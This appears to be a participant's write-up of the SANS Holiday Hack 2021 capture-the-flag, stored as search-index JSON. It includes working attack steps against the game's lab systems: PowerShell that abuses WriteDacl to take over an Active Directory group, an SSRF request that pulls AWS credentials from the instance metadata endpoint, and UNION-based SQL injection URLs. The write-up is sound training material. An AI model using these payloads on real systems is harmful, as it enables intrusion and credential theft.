Loops:32 Thr:64 Vec:16 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 3134208/4003615 (78.28%) Rejected.........: 0/3134208 (0.00%) Restore.Point....: 0/77 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:40672-40704 Iteration:0-32 Candidates.#1....: _The_ -> cimes Password: Snow2021! smbclient -U elfu_svc //172.17.0.4/elfu_svc_shr Use the password from the cracked hash Can now see all the files on this share: elfu_svc_shr cat .ps1 | grep -l -R remote_elf Found this file: (after grep for \"remote_elf\") GetProcessInfo.ps1 powershell -Command \"./GetProcessInfo.ps1\" $SecStringPassword = \"76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA\" $aPass = $SecStringPassword | ConvertTo-SecureString -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7 $aCred = New-Object System.Management.Automation.PSCredential -ArgumentList (\"elfu.local\\remote_elf\", $aPass) Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { Get-Process } -Credential $aCred -Authentication Negotiate NPM(K) PM(M) WS(M) CPU(s) Id SI ProcessName PSComputerNam e ------ ----- ----- ------ -- -- ----------- ------------- 9 4.30 10.10 0.00 1444 0 conhost 10.128.1.53 9 6.54 12.22 0.02 4020 0 conhost 10.128.1.53 20 2.31 5.46 0.00 596 0 csrss 10.128.1.53 9 1.64 4.71 0.00 676 1 csrss 10.128.1.53 32 17.13 22.79 0.00 3912 0 dfsrs 10.128.1.53 12 2.46 7.86 0.00 2940 0 dfssvc 10.128.1.53 powershell -C \"./remote.ps1\" Now insert script blocks from presentation. List users who have writeDacl to \"Research Department\" Give \"Generic All\" to my low-priv domain user for this group. Add my low-priv user to this group. Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { # 1. $ADSI = [ADSI]\"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local\" $ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount]) # 2. Add-Type -AssemblyName System.DirectoryServices $ldapConnString = \"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local\" $username = \"xvduawqtni\" $nullGUID = [guid]'00000000-0000-0000-0000-000000000000' $propGUID = [guid]'00000000-0000-0000-0000-000000000000' $IdentityReference = (New-Object System.Security.Principal.NTAccount(\"elfu.local\\$username\")).Translate([System.Security.Principal.SecurityIdentifier]) $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] \"GenericAll\"), ([System.Security.AccessControl.AccessControlType] \"Allow\"), $propGUID, $inheritanceType, $nullGUID $domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString $secOptions = $domainDirEntry.get_Options() $secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl $domainDirEntry.RefreshCache() $domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE) $domainDirEntry.CommitChanges() $domainDirEntry.dispose() # 3. Add-Type -AssemblyName System.DirectoryServices $ldapConnString = \"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local\" $username = \"xvduawqtni\" $password = \"Hbqwldgap#\" $domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password $user = New-Object System.Security.Principal.NTAccount(\"elfu.local\\$username\") $sid=$user.Translate([System.Security.Principal.SecurityIdentifier]) $b=New-Object byte[] $sid.BinaryLength $sid.GetBinaryForm($b,0) $hexSID=[BitConverter]::ToString($b).Replace('-','') $domainDirEntry.Add(\"LDAP://<SID=$hexSID>\") $domainDirEntry.CommitChanges() $domainDirEntry.dispose() } -Credential $aCred -Authentication Negotiate remote_elf has WriteDacl on \"Research Department\" group PSComputerName : 10.128.1.53 RunspaceId : 82625daa-6e87-4675-a5db-da200050c428 ActiveDirectoryRights : WriteDacl InheritanceType : None ObjectType : 00000000-0000-0000-0000-000000000000 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : None AccessControlType : Allow IdentityReference : ELFU\\remote_elf IsInherited : False InheritanceFlags : None PropagationFlags : None added my user to \"Research Department\" group PSComputerName : 10.128.1.53 RunspaceId : 82625daa-6e87-4675-a5db-da200050c428 ActiveDirectoryRights : GenericAll InheritanceType : None ObjectType : 00000000-0000-0000-0000-000000000000 InheritedObjectType : 00000000-0000-0000-0000-000000000000 ObjectFlags : None AccessControlType : Allow IdentityReference : ELFU\\xvduawqtni IsInherited : False InheritanceFlags : None PropagationFlags : None smbclient -U xvduawqtni //172.17.0.4/research_dep (password: Hbqwldgap#) Enter WORKGROUP\\xvduawqtni's password: Try \"help\" to get a list of possible commands. smb: \\> dir . D 0 Thu Dec 2 16:39:42 2021 .. D 0 Sun Dec 26 08:01:29 2021 SantaSecretToAWonderfulHolidaySeason.pdf N 173932 Thu Dec 2 16:38:26 2021 41089256 blocks of size 1024. 34768316 blocks available","title":"Objective 8: Kerberoasting"},{"location":"objectives/#objective-9-splunk","text":"Answer: whiz Help Angel Candysalt solve the Splunk challenge in Santa's great hall. Fitzy Shortstack is in Santa's lobby, and he knows a few things about Splunk. What does Santa call you when when you complete the analysis? Capture the commands Eddie ran most often, starting with git. Looking only at his process launches as reported by Sysmon, record the most common git-related CommandLine that Eddie seemed to use. Tip: Add \"CommandLine\" to Splunk columns Answer: git status Looking through the git commands Eddie ran, determine the remote repository that he configured as the origin for the 'partnerapi' repo. The correct one! Tip: Look at rare commands * Answer: git@github.com:elfnp3/partnerapi.git The 'partnerapi' project that Eddie worked on uses Docker. Gather the full docker command line that Eddie used to start the 'partnerapi' project on his workstation. Answer: docker compose up Eddie had been testing automated static application security testing (SAST) in GitHub. Vulnerability reports have been coming into Splunk in JSON format via GitHub webhooks. Search all the events in the main index in Splunk and use the sourcetype field to locate these reports. Determine the URL of the vulnerable GitHub repository that the elves cloned for testing and document it here. You will need to search outside of Splunk (try GitHub) for the original name of the repository. https://github.com/elfnp3/dvws-node Answer: https://github.com/snoopysecurity/dvws-node Santa asked Eddie to add a JavaScript library from NPM to the 'partnerapi' project. Determine the name of the library and record it here for our workshop documentation. Answer: holiday-utils-js Another elf started gathering a baseline of the network activity that Eddie generated. Start with their search and capture the full process_name field of anything that looks suspicious. Answer: /usr/bin/nc.openbsd Uh oh. This documentation exercise just turned into an investigation. Starting with the process identified in the previous task, look for additional suspicious commands launched by the same parent process. One thing to know about these Sysmon events is that Network connection events don't indicate the parent process ID, but Process creation events do! Determine the number of files that were accessed by a related process and record it here. Answer: 6 Use Splunk and Sysmon Process creation data to identify the name of the Bash script that accessed sensitive files and (likely) transmitted them to a remote IP address. Answer: preinstall.sh","title":"Objective 9: Splunk!"},{"location":"objectives/#objective-10-now-hiring","text":"Answer: CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX What is the secret access key for the Jack Frost Tower job applications server? Brave the perils of Jack's bathroom to get hints from Noxious O. D'or. Hint: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html FORM REQUEST GET /?inputName=106&inputEmail=101%40gmail.com& inputPhone=1234567890& inputField=Aggravated+pulling+of+hair&resumeFile=web_purple_expense.zip& inputWorkSample=http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role/& additionalInformation=&submit= HTTP/2 Host: apply.jackfrosttower.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://apply.jackfrosttower.com/?p=apply Upgrade-Insecure-Requests: 1 Te: trailers FORM RESPONSE <div class=\"row\"> <div class=\"col-sm-4\"> <div class=\"card text-white bg-primary mb-3\" style=\"max-width: 20rem;\"> <div class=\"card-body\"> <p class=\"card-text\"><h3><br />Naughty list recipients rejoice!<br /><br /><br /></h3></p> </div> </div> </div> <div class=\"col-sm-4\"> <div class=\"card text-white bg-secondary mb-3\" style=\"max-width: 20rem;\"> <div class=\"card-body\"> <img class=\"rounded mx-auto d-block\" src=\"images/106.jpg\" width=\"200px\" /> </div> </div> </div> <div class=\"col-sm-4\"> <div class=\"card text-white bg-primary mb-3\" style=\"max-width: 20rem;\"> <div class=\"card-body\"> <p class=\"card-text\"><h3><br />We'll be in touch.<br /><br /><br /></h3></p> </div> </div> </div> IMAGE REQUEST GET /images/106.jpg HTTP/2 Host: apply.jackfrosttower.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Te: trailers IMAGE RESPONSE HTTP/2 200 OK Server: nginx/1.16.1 Date: Wed, 29 Dec 2021 01:54:36 GMT Content-Type: image/jpeg Content-Length: 308 Last-Modified: Wed, 29 Dec 2021 01:54:35 GMT Etag: \"61cbbfdb-134\" Expires: Mon, 03 Jan 2022 01:54:36 GMT Cache-Control: max-age=432000 Accept-Ranges: bytes Via: 1.1 google Alt-Svc: clear { \"Code\": \"Success\", \"LastUpdated\": \"2021-05-02T18:50:40Z\", \"Type\": \"AWS-HMAC\", \"AccessKeyId\": \"AKIA5HMBSK1SYXYTOXX6\", \"SecretAccessKey\": \"CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX\", \"Token\": \"NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==\", \"Expiration\": \"2026-05-02T18:50:40Z\" }","title":"Objective 10: Now Hiring!"},{"location":"objectives/#objective-11-complaint","text":"Answer: \"Flud Hagg Yaqh\" Customer Complaint Analysis: A human has accessed the Jack Frost Tower network with a non-compliant host. Which three trolls complained about the human? Enter the troll names in alphabetical order separated by spaces. Talk to Tinsel Upatree in the kitchen for hints. Hints Are you familiar with RFC3514? Wireshark uses a different name for the Evil Bit: ip.flags.rb. HTTP responses are often gzip compressed. Fortunately, Wireshark decompresses them for us automatically. You can search for strings in Wireshark fields using display filters with the contains keyword. ip.flags.rb == 0 && http.request.uri matches \"php\" non-compliant host ip.flags.rb == 1 && http.request.uri matches \"php\" search for trolls complaing about this woman Form item: \"description\" = \"I have never, in my life, been in a facility with such a horrible staff. They are rude and insulting. What kind of place is this? You can be sure that I (or my lawyer) will be speaking directly with Mr. Frost!\" Yaqh Form item: \"name\" = \"Yaqh\" Key: name Value: Yaqh Form item: \"guest_info\" = \"Snooty lady in room 1024\" Key: guest_info Value: Snooty lady in room 1024 Flud Form item: \"name\" = \"Flud\" Key: name Value: Flud Form item: \"guest_info\" = \"Very cranky lady in room 1024\" Key: guest_info Value: Very cranky lady in room 1024 Hagg Form item: \"name\" = \"Hagg\" Key: name Value: Hagg Form item: \"guest_info\" = \"Incredibly angry lady in room 1024\" Key: guest_info Value: Incredibly angry lady in room 1024","title":"Objective 11: Complaint"},{"location":"objectives/#objective-12-frost-tower","text":"Answer: \"clerk\" Investigate Frost Tower's website for security issues. This source code will be useful in your analysis. In Jack Frost's TODO list, what job position does Jack plan to offer Santa? Ribb Bonbowford, in Santa's dining room, may have some pointers for you. Hint https://github.com/mysqljs/mysql https://staging.jackfrosttower.com/login https://staging.jackfrosttower.com/contact Add a contact through the contact page. Then navigate to the \"search\" page. Somehow this can reliably lead to auth bypass. https://staging.jackfrosttower.com/search Add contact. Repeat this contact add (follow redirect) in Burp. Make sure to change the email in the repeat request. (Filling out the form twice is what gets auth bypass) Confirm that it was added in the response Navigate to the source page to get a 404. Navigate to the dashboard from there. server.js /detail/:id There may be an injection point here with all the coma separation stuff going on. app.get('/detail/:id', function(req, res, next) { session = req.session; var reqparam = req.params['id']; var query = \"SELECT * FROM uniquecontact WHERE id=\"; if (session.uniqueID){ try { if (reqparam.indexOf(',') > 0){ var ids = reqparam.split(','); reqparam = \"0\"; for (var i=0; i<ids.length; i++){ query += tempCont.escape(m.raw(ids[i])); query += \" OR id=\" } query += \"?\"; }else{ query = \"SELECT * FROM uniquecontact WHERE id=?\" } } catch (error) { console.log(error); return res.sendStatus(500); } select 1 This actually works, which means it must be the injection point GET /detail/125,12,16,(select+1) HTTP/2 Host: staging.jackfrosttower.com Cookie: _csrf=4ThebgHvu33K8JEg5KsizVyg; connect.sid=s%3AiVFeHdfrsnjtuI6nqzy7Uyge-LrJJ0FW.DQkOqPuLp%2BSZUfdDPc11V8DOdy8u7Iui%2BYDG99w0Cqk User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 If-None-Match: W/\"b53-wp032t1fGTjUmIAT8GqIU8iYtjk\" Te: trailers select id GET /detail/125,12,16,(select+id) HTTP/2 select with pipe GET /detail/1||(select+id,email)||id HTTP/2 SELECT 1,2,3,4 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d SELECT schema_name FROM information_schema.schemata limit 1 offset 1 https://staging.jackfrosttower.com/detail/1, 2 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT schema_name FROM information_schema.schemata limit 1 offset 1)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g -- SELECT table_name FROM information_schema.tables WHERE table_schema='encontact' limit 1 offset 0 todo https://staging.jackfrosttower.com/detail/1,%202%20UNION%20SELECT%20*%20FROM%20(SELECT%201)a%20JOIN%20(SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema='encontact'%20limit%201%20offset%201%20)b%20JOIN%20(SELECT%20password%20from%20users%20limit%201)c%20JOIN%20(SELECT%204)d%20JOIN%20(SELECT%205)e%20JOIN%20(SELECT%206)f%20JOIN%20(SELECT%207)g%20-- https://staging.jackfrosttower.com/detail/1,%202%20UNION%20SELECT%20*%20FROM%20(SELECT%201)a%20JOIN%20(select%20*%20from%20todo)b%20JOIN%20(SELECT%205)e%20JOIN%20(SELECT%206)f%20JOIN%20(SELECT%207)g%20-- https://staging.jackfrosttower.com/detail/1, 2 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g -- https://staging.jackfrosttower.com/detail/1, 2 UNION SELECT * FROM (SELECT 1)a JOIN (select * from todo)b JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g --","title":"Objective 12:  Frost Tower"},{"location":"objectives/#objective-13-fpga","text":"Write your first FPGA program to make a doll sing. You might get some suggestions from Grody Goiterson, near Jack's elevator. Hello, students! In exercise #4, we continue our FPGA journey, documenting the creation of the sound chip for this holiday season's new Kurse 'em Out Karen doll. Our goal is to make the doll say its trademark phrase. But, as I always tell you in class, we must walk before we run. Before the doll can say anything, we must first have it make noise. In this exercise you will design an FPGA module that creates a square wave tone at a variable frequency. Creating a square wave output takes our clock signal (which is also a square wave) and uses a counter to divide the clock to match the desired frequency. One tricky problem that we'll encounter is that Verilog (v1364-2005) doesn't have a built-in mechanism to round real numbers to integers, so you'll need to devise a means to do that correctly if you want your module to match frequencies accurately. Good luck and always remember: If $rtoi(real_no * 10) - ($rtoi(real_no) * 10) > 4, add 1 FINAL CODE // Note: For this lab, we will be working with QRP Corporation's CQC-11 FPGA. // The CQC-11 operates with a 125MHz clock. // Your design for a tone generator must support the following // inputs/outputs: // (NOTE: DO NOT CHANGE THE NAMES. OUR AUTOMATED GRADING TOOL // REQUIRES THE USE OF THESE NAMES!) // input clk - this will be connected to the 125MHz system clock // input rst - this will be connected to the system board's reset bus // input freq - a 32 bit integer indicating the required frequency // (0 - 9999.99Hz) formatted as follows: // 32'hf1206 or 32'd987654 = 9876.54Hz // output wave_out - a square wave output of the desired frequency // you can create whatever other variables you need, but remember // to initialize them to something! `timescale 1ns/1ns module tone_generator ( input clk, input rst, input [31:0] freq, output wave_out ); reg[31:0] counter = 0; reg[31:0] freqo; reg wavo = 0; assign wave_out = wavo; //If $rtoi(real_no * 10) - ($rtoi(real_no) * 10) > 4, add 1 always @(posedge clk or posedge rst) begin if(rst==1) begin counter <= 0; wavo <= 0; end else begin freqo <= (125000000)/(freq/50); if(($rtoi(freqo * 10) - ($rtoi(freqo)*10)) > 4) begin freqo <= freqo + 1; end if(counter >= freqo) begin counter <= 1; wavo <= wavo ^ 1'b1; end else counter <= counter + 1; end end endmodule Sending code for analysis... Verilog parsed cleanly... Synthesizing/implementing design and generating bitstream. Bitstream will then be sent to device. This will take SEVERAL seconds... The device has been successfully programmed!","title":"Objective 13: FPGA"},{"location":"terminals/","text":"Terminals Terminal: ExifMetada (Talk to Piney Sappington) Grep the exiftool result of all files for 12-24 to find suspicious time stamps. Grep the exiftool result of all files for \"23:59\" and get the line right before it that shows the date the file was created, which is the file name in question. exiftool *.docx | grep 23:59 -B 1 Terminal: Grepping for Gold (Talk to Greasy Gopherguts) Answer all the questions in the quizme executable: What port does 34.76.1.22 have open? cat bigscan.gnmap | grep 34.76.1.22 Answer: 62078 What port does 34.77.207.226 have open? cat bigscan.gnmap | grep 34.77.207.226 Answer: 8080 How many hosts appear \"Up\" in the scan? cat bigscan.gnmap | grep Up | wc -l Answer: 26054 How many hosts have a web port open? (Let's just use TCP ports 80, 443, and 8080) cat bigscan.gnmap | grep http | wc -l Answer: 14372 How many hosts with status Up have no (detected) open TCP ports? Subtract tcp from Up cat bigscan.gnmap | grep Up | wc -l cat bigscan.gnmap | grep tcp | wc -l Answer: 402 What's the greatest number of TCP ports any one host has open? cat bigscan.gnmap | awk '/80\\/open/ {print $17}' | grep open The 17th column shows the 12th open port and this is the last one that any host displays. Answer: 12 Terminal: Logic Munchers My son did this for me. He just went around as fast as he could with his mad gaming skills and grabbed every true thing he could find before the trolls got him. Terminal: IPv6 Sandbox Use hints from this Gist: https://gist.github.com/chriselgee/c1c69756e527f649d0a95b6f20337c2f We need to find the machine where the password is located. Look for addresses in your subnet: ping6 ff02::1 -c2 fe80::42:57ff:fe11:b28%eth0 fe80::42:c0ff:fea8:a002%eth0 Run nmap to see what ports they have open: nmap -6 fe80::42:57ff:fe11:b28%eth0 22/tcp, 3000/tcp nmap -6 fe80::42:c0ff:fea8:a002%eth0 80/tcp, 9000/tcp [ Hit the cslistener service with netcat: nc -6 fe80::42:c0ff:fea8:a002%eth0 9000 password: PieceOnEarth Terminal: Santa's Holiday Hero Chimney Scissorsticks in Netwars Area My son came in and told me to do the following: Don't spam the controls Don't keep hitting after notes after they've passed \"Dad, you're lucky you got a good partner.\" (Apparently I'm not very good at this.) Terminal: Frostavator TO DO: Complete the explanation of this terminal challenge. Figure out how to explain with respect to Frostavator. This is an XOR gate challenge. Some notes: Terminal: Ho Ho ... No echo \"[custom_jail] enabled = true logpath = /var/log/hohono.log findtime = 60m maxretry = 10 bantime = 30m filter = custom_filter action = custom_action \" > /etc/fail2ban/jail.d/custom_jail.conf echo \"[Definition] actionban = /root/naughtylist add <ip> actionunban = /root/naughtylist del <ip> \" > /etc/fail2ban/action.d/custom_action.conf echo \"[Definition] failregex = [Ll]ogin from <HOST> rejected [Ff]ailed login from <HOST> for [Ii]nvalid heartbeat\\s'([^']*)'\\sfrom\\s<HOST> <HOST> sent a malformed request \" > /etc/fail2ban/filter.d/custom_filter.conf cat /etc/fail2ban/jail.d/custom_jail.conf cat /etc/fail2ban/filter.d/custom_filter.conf cat /etc/fail2ban/action.d/custom_action.conf fail2ban-regex /var/log/hohono.log /etc/fail2ban/filter.d/custom_filter.conf service fail2ban restart /root/naughtylist refresh Terminal: Yara Analysis cat ./yara_rules/rules.yar cat ./yara_rules/rules.yar | grep 'yara_rule_135 {' -A 10 meta: description = \"binaries - file Sugar_in_the_machinery\" author = \"Sparkle Redberry\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-21\" hash = \"19ecaadb2159b566c39c999b0f860b4d8fc2824eb648e275f57a6dbceaf9b488\" strings: $s = \"candycane\" condition: $s ``` **cat ./yara_rules/rules.yar | grep 'yara_rule_1056 {' -A 10 ** rule yara_rule_1056 { meta: description = \"binaries - file frosty.exe\" author = \"Sparkle Redberry\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-21\" hash = \"b9b95f671e3d54318b3fd4db1ba3b813325fcef462070da163193d7acb5fcd03\" strings: $s1 = {6c 6962 632e 736f 2e36} $hs2 = {726f 6772 616d 2121} condition: all of them } **cat ./yara_rules/rules.yar | grep 'yara_rule_1732 {' -A 10 ** ``` rule yara_rule_1732 { meta: description = \"binaries - alwayz_winter.exe\" author = \"Santa\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-22\" hash = \"c1e31a539898aab18f483d9e7b3c698ea45799e78bddc919a7dbebb1b40193a8\" strings: $s1 = \"This is critical for the execution of this program!!\" fullword ascii $s2 = \"__frame_dummy_init_array_entry\" fullword ascii $s3 = \".note.gnu.property\" fullword ascii $s4 = \".eh_frame_hdr\" fullword ascii $s5 = \"__FRAME_END__\" fullword ascii $s6 = \"__GNU_EH_FRAME_HDR\" fullword ascii $s7 = \"frame_dummy\" fullword ascii $s8 = \".note.gnu.build-id\" fullword ascii $s9 = \"completed.8060\" fullword ascii $s10 = \"_IO_stdin_used\" fullword ascii $s11 = \".note.ABI-tag\" fullword ascii $s12 = \"naughty string\" fullword ascii $s13 = \"dastardly string\" fullword ascii $s14 = \"__do_global_dtors_aux_fini_array_entry\" fullword ascii $s15 = \"__libc_start_main@@GLIBC_2.2.5\" fullword ascii $s16 = \"GLIBC_2.2.5\" fullword ascii $s17 = \"its_a_holly_jolly_variable\" fullword ascii $s18 = \"__cxa_finalize\" fullword ascii $s19 = \"HolidayHackChallenge{NotReallyAFlag}\" fullword ascii $s20 = \"__libc_csu_init\" fullword ascii condition: uint32(1) == 0x02464c45 and filesize < 50KB and 10 of them truncate -s +100000 the_critical_elf_app ./the_critical_elf_app ./the_critical_elf_app: error while loading shared libraries: libc/so.6: cannot open shared object file: No such file or directory Machine Running.. Toy Levels: Very Merry, Terry Naughty/Nice Blockchain Assessment: Untampered Candy Sweetness Gauge: Exceedingly Sugarlicious Elf Jolliness Quotient: 4a6f6c6c7920456e6f7567682c204f76657274696d6520417070726f766564 Terminal: IMDS Exploration curl http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role curl http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role { \"Code\": \"Success\", \"LastUpdated\": \"2021-12-02T18:50:40Z\", \"Type\": \"AWS-HMAC\", \"AccessKeyId\": \"AKIA5HMBSK1SYXYTOXX6\", \"SecretAccessKey\": \"CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX\", \"Token\": \"NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==\", \"Expiration\": \"2026-12-02T18:50:40Z\" curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/placement/region Terminal: Strace Ltrace Retrace ltrace ./make_the_candy fopen(\"registration.json\", \"r\") = 0 puts(\"Unable to open configuration fil\"...Unable to open configuration file. ) = 35 +++ exited (status 1) +++ strace ./make_the_candy execve(\"./make_the_candy\", [\"./make_the_candy\"], 0x7fffb8ba06d0 /* 12 vars */) = 0 brk(NULL) = 0x55642b49e000 access(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory) access(\"/etc/ld.so.preload\", R_OK) = -1 ENOENT (No such file or directory) openat(AT_FDCWD, \"/etc/ld.so.cache\", O_RDONLY|O_CLOEXEC) = 3 fstat(3, {st_mode=S_IFREG|0644, st_size=19540, ...}) = 0 mmap(NULL, 19540, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcbb5834000 close(3) = 0 access(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory) openat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libc.so.6\", O_RDONLY|O_CLOEXEC) = 3 read(3, \"\\177ELF\\2\\1\\1\\3\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0\\20\\35\\2\\0\\0\\0\\0\\0\"..., 832) = 832 fstat(3, {st_mode=S_IFREG|0755, st_size=2030928, ...}) = 0 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fcbb5832000 mmap(NULL, 4131552, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fcbb521f000 mprotect(0x7fcbb5406000, 2097152, PROT_NONE) = 0 mmap(0x7fcbb5606000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e7000) = 0x7fcbb5606000 mmap(0x7fcbb560c000, 15072, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fcbb560c000 close(3) = 0 arch_prctl(ARCH_SET_FS, 0x7fcbb58334c0) = 0 mprotect(0x7fcbb5606000, 16384, PROT_READ) = 0 mprotect(0x55642a814000, 4096, PROT_READ) = 0 mprotect(0x7fcbb5839000, 4096, PROT_READ) = 0 munmap(0x7fcbb5834000, 19540) = 0 brk(NULL) = 0x55642b49e000 brk(0x55642b4bf000) = 0x55642b4bf000 openat(AT_FDCWD, \"registration.json\", O_RDONLY) = 3 fstat(3, {st_mode=S_IFREG|0644, st_size=0, ...}) = 0 read(3, \"\", 4096) = 0 fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0 write(1, \"Unregistered - Exiting.\\n\", 24Unregistered - Exiting. ) = 24 exit_group(1) = ? +++ exited with 1 +++ ltrace ./make_the_candy fopen(\"registration.json\", \"r\") = 0x561d0a628260 getline(0x7ffc50e863d0, 0x7ffc50e863d8, 0x561d0a628260, 0x7ffc50e863d8) = 2 strstr(\"{\\n\", \"Registration\") = nil getline(0x7ffc50e863d0, 0x7ffc50e863d8, 0x561d0a628260, 0x7ffc50e863d8) = 20 strstr(\" name: CottonCandy\\n\", \"Registration\") = nil getline(0x7ffc50e863d0, 0x7ffc50e863d8, 0x561d0a628260, 0x7ffc50e863d8) = 2 strstr(\"}\\n\", \"Registration\") = nil getline(0x7ffc50e863d0, 0x7ffc50e863d8, 0x561d0a628260, 0x7ffc50e863d8) = -1 puts(\"Unregistered - Exiting.\"Unregistered - Exiting. ) = 24 +++ exited (status 1) +++ registration.json \"strstr\" shows what string the program is looking for \"strchr\" shows what character the program is looking for \"Registration:True\" Terminal: The Elf C0de Most of the information you'll need is provided during the game, but I'll give you a few more pointers, if you want them. Not sure what a lever requires? Click it in the Current Level Objectives panel. You can move the elf with commands like elf.moveLeft(5), elf.moveTo({\"x\":2,\"y\":2}), or elf.moveTo(lever0.position). Looping through long movements? Don't be afraid to moveUp(99) or whatever. You elf will stop at any obstacle. You can call functions like myFunction(). If you ever need to pass a function to a munchkin, you can use myFunction without the (). import elf, munchkins, levers, lollipops, yeeters, pits # Grab our lever object lever = levers.get(0) munchkin = munchkins.get(0) lollipop = lollipops.get(0) # move to lever position elf.moveTo(lever.position) # get lever int and add 2 and submit val leverData = lever.data() + 2 lever.pull(leverData) # Grab lollipop and stand next to munchkin elf.moveLeft(1) elf.moveUp(8) # Solve the munchkin's challenge munchList = munchkin.ask() # e.g. [1, 3, \"a\", \"b\", 4] answer_list = [] for elem in munchList: if type(elem) == int: answer_list.append(elem) munchkin.answer(answer_list) elf.moveUp(2) # Move to finish Level 1 import elf, munchkins, levers, lollipops, yeeters, pits lollipop = lollipops.get(0) elf.moveTo(lollipop.position) elf.moveTo({\"x\":2,\"y\":2}) Level 2 import elf, munchkins, levers, lollipops, yeeters, pits #lollipop = lollipops.get(1) #elf.moveTo(lollipop.position) lollipop = lollipops.get(1) elf.moveTo(lollipop.position) lollipop = lollipops.get(0) elf.moveTo(lollipop.position) elf.moveTo({\"x\":2,\"y\":2}) Level 3 You can walk past the Yeeter once you complete lever0's task and lever0.pull(modified_data) in the desired way to disable to Yeeter trap. Click on the lever 0 object in the CURRENT LEVEL OBJECTS panel for more information. import elf, munchkins, levers, lollipops, yeeters, pits lever0 = levers.get(0) lollipop0 = lollipops.get(0) elf.moveTo(lever0.position) leverData = lever0.data()+2 lever0.pull(leverData) elf.moveTo(lollipop0.position) elf.moveTo({\"x\":2,\"y\":2}) Level 4 Objective Submit ANY string object to this lever using lever.pull(string_object) Note If you submit a correct answer to lever.pull(answer), then the lever and its corresponding trap will be disabled. In order to run lever.pull(answer) with lever (#4), you must be standing in its grid square located at (x:2,y:12). This particular lever object can be saved to a variable named lever using lever = levers.get(4) import elf, munchkins, levers, lollipops, yeeters, pits lever0, lever1, lever2, lever3, lever4 = levers.get() 